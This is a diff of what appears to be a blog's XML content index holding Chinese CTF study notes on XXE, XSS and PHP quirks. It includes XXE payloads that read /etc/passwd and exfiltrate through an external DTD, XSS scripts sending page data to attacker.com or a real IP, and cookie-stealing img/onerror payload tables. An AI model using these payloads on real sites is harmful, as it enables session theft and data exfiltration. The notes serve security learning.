-    <content><![CDATA[<h1 id="xxe的原理"><a href="#xxe的原理" class="headerlink" title="xxe的原理:"></a>xxe的原理:</h1><p>可以通过构造恶意 XML 数据，引入外部实体来实现：</p>
-<ul>
-<li>读取本地敏感文件（如 <code>/etc/passwd</code>）</li>
-<li>进行内网 SSRF</li>
-<li>拒绝服务（Billion Laughs）</li>
-<li>执行系统命令（少见，取决于 parser）</li>
-</ul>
-<h2 id="1-xxe的前提"><a href="#1-xxe的前提" class="headerlink" title="1.xxe的前提:"></a>1.xxe的前提:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);    --允许加载外部实体（XXE的前提）</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-常见的攻击方式"><a href="#2-常见的攻击方式" class="headerlink" title="2.常见的攻击方式:"></a>2.常见的攻击方式:</h2><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>📁 本地文件读取</td>
-<td>读取敏感文件</td>
-<td><code>file:///etc/passwd</code></td>
-</tr>
-<tr>
-<td>🌐 SSRF</td>
-<td>访问内网资源</td>
-<td><code>http://127.0.0.1/admin</code></td>
-</tr>
-<tr>
-<td>💣 DoS</td>
-<td>百万笑攻击导致内存爆炸</td>
-<td><code>&lt;!ENTITY a &quot;&amp;a;&amp;a;&amp;a;&quot;&gt;</code></td>
-</tr>
-<tr>
-<td>📤 外带</td>
-<td>将数据发送到外部服务器</td>
-<td><code>http://attacker.com/?d=&amp;xxe;</code></td>
-</tr>
-<tr>
-<td>😈 Blind-XXE</td>
-<td>没有直接输出，通过回显外带</td>
-<td>配合 <code>&lt;!ENTITY xxe SYSTEM &quot;http://x.x.x.x:8080/?data=...&quot; &gt;</code></td>
-</tr>
-</tbody></table>
-<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><h2 id="1-直接"><a href="#1-直接" class="headerlink" title="1.直接:"></a>1.直接:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-数据外带"><a href="#2-数据外带" class="headerlink" title="2.数据外带:"></a>2.数据外带:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---这个位置可以换成php伪协议  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-一些绕过"><a href="#3-一些绕过" class="headerlink" title="3.一些绕过"></a>3.一些绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以对数据进行UTF-<span class="number">16</span>编码绕过(使用python)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>执行顺序</p>
@@ -1713,6 +1370,399 @@
       </tags>
   </entry>
   <entry>
+    <title>xss</title>
+    <url>/2025/06/02/ctfshow/xss/</url>
+    <content><![CDATA[<h1 id="常见过滤"><a href="#常见过滤" class="headerlink" title="常见过滤:"></a>常见过滤:</h1><h2 id="如果使用了http-only"><a href="#如果使用了http-only" class="headerlink" title="如果使用了http-only:"></a>如果使用了http-only:</h2><h3 id="1-GET请求外带"><a href="#1-GET请求外带" class="headerlink" title="1.GET请求外带:"></a>1.GET请求外带:</h3><p>GET外带：</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GET方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;接口&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST外带:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST方式外带接口返回的数据</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="comment">// 发送到攻击者服务器</span></span><br><span class="line">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr2.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;https://attacker.com/post&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-POST请求外带"><a href="#2-POST请求外带" class="headerlink" title="2.POST请求外带:"></a>2.POST请求外带:</h3><p>GET外带：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. POST请求读取目标接口内容</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST外带:</p>
+<h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法:"></a>利用手法:</h1><h2 id="1-xss原理的分析"><a href="#1-xss原理的分析" class="headerlink" title="1.xss原理的分析:"></a>1.xss原理的分析:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">向网站注入恶意JavaScript代码，让别人的浏览器在受信任的网页上下文中“执行攻击者的脚本”。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-检测方式"><a href="#2-检测方式" class="headerlink" title="2. 检测方式:"></a>2. 检测方式:</h2><table>
+<thead>
+<tr>
+<th>场景&#x2F;说明</th>
+<th>Payload示例</th>
+<th>备注&#x2F;实战效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>经典弹窗</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>判断能否插入原生JS</td>
+</tr>
+<tr>
+<td>双引号闭合</td>
+<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>用于参数被包在引号里</td>
+</tr>
+<tr>
+<td>单引号闭合</td>
+<td><code>&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td>img标签onerror</td>
+<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
+<td>绕过部分过滤，低版本IE必弹窗</td>
+</tr>
+<tr>
+<td>svg标签onload</td>
+<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
+<td>对svg支持较弱站点，能绕标签限制</td>
+</tr>
+<tr>
+<td>body标签onload</td>
+<td><code>&lt;body onload=alert(1)&gt;</code></td>
+<td>HTML主体注入点</td>
+</tr>
+<tr>
+<td>input标签onfocus</td>
+<td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
+<td>页面插入input时测试</td>
+</tr>
+<tr>
+<td>a标签onclick</td>
+<td><code>&lt;a href=&quot;#&quot; onclick=alert(1)&gt;点我&lt;/a&gt;</code></td>
+<td>需用户操作</td>
+</tr>
+<tr>
+<td>script块注入</td>
+<td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>封闭script后再注入新的</td>
+</tr>
+<tr>
+<td>js事件属性（万能型）</td>
+<td><code>&lt;button onmouseover=alert(1)&gt;XSS&lt;/button&gt;</code></td>
+<td>鼠标事件型绕过</td>
+</tr>
+<tr>
+<td>html注释穿插</td>
+<td><code>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</code></td>
+<td>盲测注释处理不严的模板</td>
+</tr>
+<tr>
+<td>盲打型payload</td>
+<td><code>&lt;img src=1 onerror=fetch(&#39;//你的域名/log?c=&#39;+document.cookie)&gt;</code></td>
+<td>无回显场景，后台日志收集</td>
+</tr>
+<tr>
+<td>反射测试</td>
+<td><code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
+<td>方便区分当前站点</td>
+</tr>
+<tr>
+<td>DOM型测试</td>
+<td><code>#&quot;&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;</code></td>
+<td>DOM拼接位置必测</td>
+</tr>
+<tr>
+<td>href&#x2F;jump跳转型</td>
+<td><code>javascript:alert(1)</code></td>
+<td>测url跳转、链接、按钮</td>
+</tr>
+</tbody></table>
+<h2 id="3-常见img回流"><a href="#3-常见img回流" class="headerlink" title="3.常见img回流:"></a>3.常见img回流:</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类:"></a>1.分类:</h3><table>
+<thead>
+<tr>
+<th>场景&#x2F;目的</th>
+<th>payload示例</th>
+<th>说明&#x2F;攻防技巧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>标准最常用</td>
+<td><code>&lt;img src=&quot;http://your.com/xss.php?cookie=&quot;+document.cookie&gt;</code></td>
+<td>简单直观，很多场景可用</td>
+</tr>
+<tr>
+<td>利用onerror事件</td>
+<td><code>&lt;img src=1 onerror=&quot;new Image().src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
+<td>兼容性强，可防止部分src过滤</td>
+</tr>
+<tr>
+<td>onerror多参数</td>
+<td><code>&lt;img src=x onerror=&quot;this.src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
+<td>利用自身src属性，无需new对象</td>
+</tr>
+<tr>
+<td>base64绕过</td>
+<td><code>&lt;img src=1 onerror=&quot;new Image().src=atob(&#39;aHR0cDovL3lvdXIuY29tL3hzcw==&#39;)+document.cookie&quot;&gt;</code></td>
+<td>避免明文URL被过滤</td>
+</tr>
+<tr>
+<td>多事件联合</td>
+<td><code>&lt;img src=1 onerror=&quot;document.body.appendChild(new Image()).src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
+<td>兼容部分内联过滤</td>
+</tr>
+<tr>
+<td>利用fetch</td>
+<td><code>&lt;img src=1 onerror=&quot;fetch(&#39;http://your.com/xss.php?cookie=&#39;+document.cookie)&quot;&gt;</code></td>
+<td>某些现代浏览器可用</td>
+</tr>
+<tr>
+<td>伪装UA等信息回流</td>
+<td><code>&lt;img src=&quot;http://your.com/xss.php?info=&quot;+navigator.userAgent+document.cookie&gt;</code></td>
+<td>携带更多信息</td>
+</tr>
+<tr>
+<td>GET+POST联合</td>
+<td><code>&lt;img src=1 onerror=&quot;var i=new Image();i.src=&#39;http://your.com/xss.php?c=&#39;+document.cookie&quot;&gt;</code></td>
+<td>多种变量名，规避WAF</td>
+</tr>
+</tbody></table>
+<h3 id="2-区别"><a href="#2-区别" class="headerlink" title="2.区别:"></a>2.区别:</h3><table>
+<thead>
+<tr>
+<th>payload类型</th>
+<th>隐蔽性</th>
+<th>兼容性</th>
+<th>是否跳转</th>
+<th>攻防用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>img+src</td>
+<td>高</td>
+<td>很高</td>
+<td>否</td>
+<td>首选，适合所有场景</td>
+</tr>
+<tr>
+<td>img+onerror</td>
+<td>很高</td>
+<td>极高</td>
+<td>否</td>
+<td>绕过滤</td>
+</tr>
+<tr>
+<td>location.href</td>
+<td>低</td>
+<td>高</td>
+<td>是</td>
+<td>测试&#x2F;盲打为主</td>
+</tr>
+<tr>
+<td>fetch&#x2F;xmlhttp</td>
+<td>中</td>
+<td>中高</td>
+<td>否</td>
+<td>现代浏览器为主</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php特性</title>
+    <url>/2025/06/02/ctfshow/php%E7%89%B9%E6%80%A7/</url>
+    <content><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="1-intval函数"><a href="#1-intval函数" class="headerlink" title="1.intval函数:"></a>1.intval函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数 <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                如果数字前加一些字节，也不会影响进制转换    ---比如+<span class="number">010574</span>会被当成<span class="number">8</span>进制来转换</span><br><span class="line">                如果 base 是 <span class="number">0</span>，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">                如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0b&quot;</span> (或 <span class="string">&quot;0B&quot;</span>) 开头，使用 <span class="number">2</span> 进制 (<span class="keyword">binary</span>)；否则，</span><br><span class="line">                如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">                将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 <span class="keyword">int</span> 数值。   --可以通过类型转换</span><br><span class="line"><span class="title function_ invoke__">intval</span>() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。       --但是通过url，无法传递一个对象</span><br><span class="line">成功时返回 value 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。    --?c[]=<span class="number">1</span>;就把c当作一个数组</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题"><a href="#2-v1-v2，但md5-v1-md5-v2-sha1加密的一系列问题" class="headerlink" title="2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题"></a>2.v1!&#x3D;v2，但md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1加密的一系列问题</h3><h4 id="1-对于-不在意数据类型的情况"><a href="#1-对于-不在意数据类型的情况" class="headerlink" title="1.对于&#x3D;&#x3D;不在意数据类型的情况:"></a>1.对于&#x3D;&#x3D;不在意数据类型的情况:</h4><figure class="highlight php"><figcaption><span>md5</span></figcaption><table><tr><td class="code"><pre><span class="line">在php中，变量都是弱类型的（就是不指定特定数据类型的），使用<span class="keyword">if</span>判等的时候要格外小心，使用特殊的参数可能会使本来不相等的<span class="keyword">if</span>判断位相等 </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125; </span><br><span class="line">                                     ---传入a=s1885207154a，b=s1836677006a二者md5都是<span class="number">0</span>e开头，在php中<span class="number">0</span>e会被当做科学计数法，就算后面有字母，其结果也是<span class="number">0</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125;</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f </span><br><span class="line">    </span><br><span class="line">全字母原值:QNKCDZO              --<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">全数字原值:<span class="number">240610708</span>            --<span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><figcaption><span>sha1</span></figcaption><table><tr><td class="code"><pre><span class="line">以下值在sha1加密后以<span class="number">0</span>E开头：</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.对于&#x3D;&#x3D;&#x3D;</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回<span class="literal">NULL</span>                                    </span><br></pre></td></tr></table></figure>
+
+<h3 id="3-in-array-函数"><a href="#3-in-array-函数" class="headerlink" title="3.in_array()函数:"></a>3.in_array()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class="line">    --如果没有使用第三个值strict，那么needle如果为<span class="number">1</span>.php 则也会成功匹配</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Reflectionclass类"><a href="#4-Reflectionclass类" class="headerlink" title="4.Reflectionclass类:"></a>4.Reflectionclass类:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用 ReflectionClass，可以获取类的属性、方法、常量、父类、接口等信息，也可以动态地调用类的构造函数或方法等</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);</span><br><span class="line">                               ---<span class="keyword">echo</span> <span class="variable">$reflection</span>; 可以得到所有MyClass类的全部信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-hex2bin函数"><a href="#5-hex2bin函数" class="headerlink" title="5.hex2bin函数:"></a>5.hex2bin函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">赋值符号=优先级高于<span class="keyword">and</span>    </span><br><span class="line">                 --&amp;&amp; &gt; = &gt; <span class="keyword">and</span></span><br><span class="line">hex2bin         ---转换十六进制字符串为二进制字符串</span><br><span class="line">is_numeric函数:   如果传入的参数只有一个e字母，则返回<span class="literal">true</span>---科学计数法，全是数字<span class="literal">true</span></span><br><span class="line">    <span class="meta">&lt;?=</span>`cat *`;   --这个命令通过base64，在bin2hex后，输出只有一个e的数字</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-ereg-函数-PHP-7-中被移除"><a href="#6-ereg-函数-PHP-7-中被移除" class="headerlink" title="6.ereg()函数(PHP 7 中被移除)"></a>6.ereg()函数(PHP 7 中被移除)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ereg函数存在<span class="literal">NULL</span>截断漏洞，导致了正则过滤被绕过,所以可以使用%<span class="number">00</span>截断正则匹配</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-Exception类"><a href="#7-Exception类" class="headerlink" title="7.Exception类"></a>7.Exception类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span>是所有用户级异常的基类</span><br><span class="line">                             --第一个参数，会把返回值当作错误信息输出</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-FilesystemIterator文件系统迭代器"><a href="#8-FilesystemIterator文件系统迭代器" class="headerlink" title="8.FilesystemIterator文件系统迭代器"></a>8.FilesystemIterator文件系统迭代器</h3> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 是 PHP 中基于 SPL（Standard PHP Library）的一个迭代器类，用来遍历文件系统。</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>())</span><br><span class="line">                              ---两种访问当前目录的方法</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-全局数组-GLOBALS"><a href="#9-全局数组-GLOBALS" class="headerlink" title="9. 全局数组$GLOBALS"></a>9. 全局数组$GLOBALS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">全局数组<span class="variable">$GLOBALS</span>：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>)    --输出全部信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-proc-self-root"><a href="#10-proc-self-root" class="headerlink" title="10.&#x2F;proc&#x2F;self&#x2F;root"></a>10.&#x2F;proc&#x2F;self&#x2F;root</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root 是 Linux 系统中一个特殊的符号链接，它始终指向当前进程的根目录。</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-post传参"><a href="#11-post传参" class="headerlink" title="11.post传参"></a>11.post传参</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">特性<span class="number">1</span>：被get或者post传入的变量名，如果含有 空格、+、[ 则会被转化为 _</span><br><span class="line">特性<span class="number">2</span>：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换  ---php8以前</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-传参时"><a href="#12-传参时" class="headerlink" title="12.传参时"></a>12.传参时</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=flag.php              --绕过关键字</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=php:<span class="comment">//filter/               --文件包含</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="13-eval函数与assert函数"><a href="#13-eval函数与assert函数" class="headerlink" title="13.eval函数与assert函数"></a>13.eval函数与assert函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都用于执行php函数 </span><br></pre></td></tr></table></figure>
+
+<h3 id="14-SERVER-‘argv’"><a href="#14-SERVER-‘argv’" class="headerlink" title="14.$_SERVER[‘argv’]"></a>14.$_SERVER[‘argv’]</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] 就等于 <span class="variable">$_SERVER</span>[‘QUERY_STRING’]，<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 就是查询 (query) 的字符串</span><br><span class="line">                                    ---URL中 ? 号后面的原始参数字符串（不解析，不解码，直接拿原样的 query <span class="keyword">string</span>）。</span><br><span class="line">                                    ---需要php.ini 开启了register_argc_argv 配置项。</span><br></pre></td></tr></table></figure>
+
+<h3 id="15-extract函数"><a href="#15-extract函数" class="headerlink" title="15.extract函数"></a>15.extract函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">从数组中将变量导入到当前的符号表</span><br><span class="line">一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</span><br><span class="line">    ---只需要键值对就行了?..CTFSHOW..=CTFSHOW&amp;isVIP=<span class="number">1</span>,这样也会解析              </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="16-gettext拓展"><a href="#16-gettext拓展" class="headerlink" title="16.gettext拓展:"></a>16.gettext拓展:</h3><figure class="highlight plaintext"><figcaption><span>hp</span></figcaption><table><tr><td class="code"><pre><span class="line">gettext()等价于_()</span><br><span class="line">      --使用gettext()相当于echo </span><br></pre></td></tr></table></figure>
+
+<h3 id="17-stripos-函数"><a href="#17-stripos-函数" class="headerlink" title="17.stripos()函数:"></a>17.stripos()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">        --配合目录穿越使用../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="18-正则表达式溢出"><a href="#18-正则表达式溢出" class="headerlink" title="18.正则表达式溢出:"></a>18.正则表达式溢出:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则(pcre)最大回溯/递归限制</span><br><span class="line">    在使用.*?ctfshow非贪婪模式时--匹配到了ctfshow，但是如果ctfshow前面有<span class="number">10</span>万个字符，那么正则会返回<span class="literal">false</span></span><br><span class="line">        --使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.</span><br><span class="line">        --默认的backtrack_limit是<span class="number">100000</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="19-php运算符优先级"><a href="#19-php运算符优先级" class="headerlink" title="19.php运算符优先级"></a>19.php运算符优先级</h3><table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>运算符</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>()</code></td>
+<td>括号（表达式分组）</td>
+<td>&#96;($a &amp;&amp; $b)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>!</code></td>
+<td>逻辑非</td>
+<td><code>!$a</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>* / %</code></td>
+<td>乘 &#x2F; 除 &#x2F; 取模</td>
+<td><code>$a * $b</code>, <code>$a % $b</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>+ -</code></td>
+<td>加 &#x2F; 减</td>
+<td><code>$a + $b</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>.</code></td>
+<td>字符串连接</td>
+<td><code>$a . $b</code></td>
+</tr>
